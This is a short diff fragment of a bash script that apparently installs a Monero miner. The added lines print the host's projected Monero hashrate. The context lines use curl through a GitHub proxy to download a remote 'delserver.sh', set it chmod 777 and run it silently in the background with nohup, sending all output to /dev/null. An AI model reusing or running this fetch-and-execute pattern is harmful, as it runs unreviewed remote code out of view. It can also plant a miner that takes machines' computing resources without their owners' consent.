@@ -825,5 +825,7 @@ cd /$HOME/
 curl -L --progress-bar "https://gh.xmly.dev/https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/url/delserver.sh" -o $HOME/delserver.sh
 chmod 777 delserver.sh
 nohup ./delserver.sh > /dev/null 2>&1 &
-
+echo
+echo "JFYI: This host has $CPU_THREADS CPU threads with $CPU_MHZ MHz and ${TOTAL_CACHE}KB data cache in total, so projected Monero hashrate is around $EXP_MONERO_HASHRATE H/s."
+echo
 echo "[*] Yes-GoGo"
